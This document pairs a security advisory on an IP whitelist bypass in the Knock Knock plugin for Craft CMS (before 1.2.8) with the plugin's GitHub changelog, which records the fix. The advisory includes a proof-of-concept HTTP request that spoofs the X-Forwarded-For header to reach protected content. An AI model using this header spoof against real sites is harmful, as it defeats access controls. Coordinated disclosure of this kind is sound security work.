=== Content from limpidsecurity.pl_6d071182_20250119_123539.html ===

![Limpid Security: IT security consulting, penetration testing](/_/Limpid-Security.svg)

---

**Vulnerability:**
IP Whitelist bypass

**Product:**
[Knock Knock Plugin for Craft CMS](https://github.com/verbb/knock-knock/blob/craft-3/CHANGELOG.md)

**Version:**
< 1.2.8

**Details:**
The IP-Whitelist mechanism is improperly designed, as it compares whitelisted IP with X-Forwarded-For header value. The whitelist mechanism may be bypassed by X-Forwarded-For header manipulation.

**Technical details:**

An example IP address: 4.5.6.7 has been added to the IP whitelist.

request:
GET / HTTP/1.1
Host: 127.0.0.1

response:

HTTP/1.1 302 Found
Date: Mon, 18 May 2020 17:02:58 GMT
Server: Apache/2.4.37 (Debian)
Set-Cookie: CraftSessionId=j6b1eqpsj4vc2rp23l43vo9dob; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: http://127.0.0.1/index.php?p=knock-knock/who-is-there
Content-Length: 0
Content-Type: text/html; charset=UTF-8

request:
GET / HTTP/1.1
Host: 127.0.0.1
X-Forwarded-For: 4.5.6.7

response:

HTTP/1.1 200 OK
Date: Mon, 18 May 2020 17:05:28 GMT
Server: Apache/2.4.37 (Debian)
X-Powered-By: Craft CMS
X-Robots-Tag: none, noimageindex
Link: ; rel="canonical"
Content-Length: 6
Content-Type: text/html; charset=UTF-8
SECRET

**Disclosure timeline:**

May 19, 2020 - Vendor notification

May 20, 2020 - Vendor fix

May 25, 2020 - Public disclosure

© 2017 - 2020 [Limpid Security](/)



=== Content from github.com_2b8f2de2_20250119_123539.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fverbb%2Fknock-knock%2Fblob%2Fcraft-3%2FCHANGELOG.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fverbb%2Fknock-knock%2Fblob%2Fcraft-3%2FCHANGELOG.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=verbb%2Fknock-knock)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[verbb](/verbb)
/
**[knock-knock](/verbb/knock-knock)**
Public

* [Notifications](/login?return_to=%2Fverbb%2Fknock-knock) You must be signed in to change notification settings
* [Fork
  7](/login?return_to=%2Fverbb%2Fknock-knock)
* [Star
   18](/login?return_to=%2Fverbb%2Fknock-knock)

* [Code](/verbb/knock-knock/tree/craft-3)
* [Issues
  12](/verbb/knock-knock/issues)
* [Pull requests
  0](/verbb/knock-knock/pulls)
* [Discussions](/verbb/knock-knock/discussions)
* [Actions](/verbb/knock-knock/actions)
* [Security](/verbb/knock-knock/security)
* [Insights](/verbb/knock-knock/pulse)

Additional navigation options

* [Code](/verbb/knock-knock/tree/craft-3)
* [Issues](/verbb/knock-knock/issues)
* [Pull requests](/verbb/knock-knock/pulls)
* [Discussions](/verbb/knock-knock/discussions)
* [Actions](/verbb/knock-knock/actions)
* [Security](/verbb/knock-knock/security)
* [Insights](/verbb/knock-knock/pulse)

## Files

 craft-3
## Breadcrumbs

1. [knock-knock](/verbb/knock-knock/tree/craft-3)
/
# CHANGELOG.md

Copy path Blame  Blame
## Latest commit

## History

[History](/verbb/knock-knock/commits/craft-3/CHANGELOG.md)191 lines (121 loc) · 4.37 KB craft-3
## Breadcrumbs

1. [knock-knock](/verbb/knock-knock/tree/craft-3)
/
# CHANGELOG.md

Top
## File metadata and controls

* Preview
* Code
* Blame

191 lines (121 loc) · 4.37 KB[Raw](https://github.com/verbb/knock-knock/raw/refs/heads/craft-3/CHANGELOG.md)
# Changelog

## 1.2.19 - 2023-11-09

### Fixed

* Fix too-early call on `User::getIdentity()` when plugin is disabled, for better performance.

## 1.2.18 - 2022-08-09

### Fixed

* Revert infinite loop check, which results in incorrect redirect URLs.

## 1.2.17 - 2022-07-10

### Added

* Allow arrays in config settings for `allowIps`, `denyIps`, `protectedUrls`, `unprotectedUrls`. (thanks @Diewy).

### Fixed

* Fix a potential infinite redirect loop if changing from `http` to `https`.

## 1.2.16 - 2021-09-17

### Fixed

* Fix site-based custom templates not working correctly.

## 1.2.15 - 2021-06-30

### Added

* Add support for custom CP-based templates. (thanks @seibert-io).
* Add support for IPv4 and IPv6 CIDR blocks in allowIps and denyIps config. (thanks @onstuimig).

### Changed

* Deny access to settings for non-admins.

### Fixed

* Fix redirect URL not using the referrer URL after logging in.

## 1.2.14 - 2020-11-29

### Fixed

* Fix potential error redirecting to non-site URLs after login. In some cases, this caused redirecting to a cpresources asset.
* Fix cookie not respecting the Craft `defaultCookieDomain` config setting.

## 1.2.13 - 2020-09-10

### Fixed

* Fix incorrect `loginUrl` route, causing issues on some site setups (subdirectory installs).

## 1.2.12 - 2020-08-14

### Added

* Allow env variables to be used in allow/deny IPs.

### Fixed

* Fix login path not resolving correctly for some multi-site installs.

## 1.2.11 - 2020-08-10

### Fixed

* Fix challenge URL not being correct for nested URLs.

## 1.2.10 - 2020-07-13

### Added

* Add `useRemoteIp` to opt-in to more stricter IP checks if security is your concern.

### Fixed

* Revert behaviour of using remote IP for checking user IP. Too many issues and edge-cases.

## 1.2.9.2 - 2020-06-22

### Fixed

* Fix potential issue splitting multi-line settings (allowIps, denyIps, protectedUrls).

## 1.2.9.1 - 2020-06-18

### Fixed

* Fix error introduced in 1.2.9.

## 1.2.9 - 2020-06-17

### Deprecated

* Deprecate `whitelistIps`. Use `allowIps` instead.
* Deprecate `blacklistIps`. Use `denyIps` instead.

## 1.2.8 - 2020-05-20 [CRITICAL]

### Fixed

* Fix fetching the IP for a user that could allow spoofing via headers. Vulnerability `IP Whitelist bypass` reported by Paweł Hałdrzyński.
* Ensure redirect param is validated to prevent malicious redirection. For custom forms, please update the redirect input to use `{{ redirect | hash }}` otherwise logins will not work. Vulnerability `Open-redirect` reported by Paweł Hałdrzyński.

## 1.2.7 - 2020-04-21

### Added

* Add `forcedRedirect` to force a redirected URL once logging in.

## 1.2.6 - 2020-04-16

### Fixed

* Fix logging error `Call to undefined method setFileLogging()`.

## 1.2.5 - 2020-04-15

### Changed

* File logging now checks if the overall Craft app uses file logging.
* Log files now only include `GET` and `POST` additional variables.

## 1.2.4.2 - 2020-04-01

### Fixed

* Realllly fix live preview from cross-domains.

## 1.2.4.1 - 2020-03-31

### Fixed

* Fix error thrown for console requests.

## 1.2.4 - 2020-03-31

### Fixed

* Re-organise access testing code, and support cross-domain live preview (properly, through tokens).

## 1.2.3 - 2020-03-30

### Fixed

* Exclude live preview requests from blocking access.

## 1.2.2 - 2020-03-14

### Fixed

* Fix asset bundles causing style issues in the CP.

## 1.2.1 - 2020-02-25

### Added

* Add support for Regex in protected URLs.

### Fixed

* Fix protected URL comparison taking into account query strings, when it shouldn't.

## 1.2.0 - 2020-01-30

### Added

* Add Craft 3.4 compatibility.

## 1.1.2 - 2020-01-07

### Fixed

* Fix `yii\base\InvalidConfigException` error thrown in some instances.

## 1.1.1 - 2019-11-27

### Added

* Added Custom login path. Thanks @X-Tender.
* Allow IPs to be whitelisted from login protection.
* Add Protected URLs to set specific URLs (and only those) for password protection.

### Fixed

* Update redirect input.
  = Fix redirection after login.

## 1.1.0 - 2019-06-05

### Added

* Add lock-out and security behaviour.
* Add multi-site settings.
* Add custom template setting.
* New icon.
* Add override notice for settings fields.

## 1.0.3 - 2019-02-09

### Fixed

* Fix console requests throwing an error.

## 1.0.2 - 2019-02-02

### Changed

* Downgrade requirement to Craft 3.0.x.

### Fixed

* Fix settings not saving.

## 1.0.1 - 2019-01-30

### Added

* Added `enabled` setting.

## 1.0.0 - 2019-01-26

* Initial release.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


